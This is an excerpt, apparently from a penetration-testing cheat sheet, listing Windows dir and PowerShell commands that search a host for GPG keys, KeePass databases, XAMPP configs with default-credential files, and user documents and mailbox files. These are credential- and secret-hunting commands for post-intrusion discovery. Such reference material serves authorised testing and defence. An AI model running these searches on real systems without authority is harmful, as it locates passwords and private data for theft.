dir /s /b /a C:\users\*.gpg
# usually under C:\Users\*\AppData\Roaming\gnupg\

# KeePass databases:
dir *.kdb /a /b /s
dir *.kdbx /a /b /s
powershell -c "Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"

# XAMPP config files:
powershell -c "Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue"
# my.ini is MySQL config
# passwords.txt has default creds

# User files
powershell -c "Get-ChildItem -Path C:\Users\ -Exclude Desktop.ini -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*pst,*.ost,*.eml,*.msg -File -Recurse -ErrorAction SilentlyContinue"
```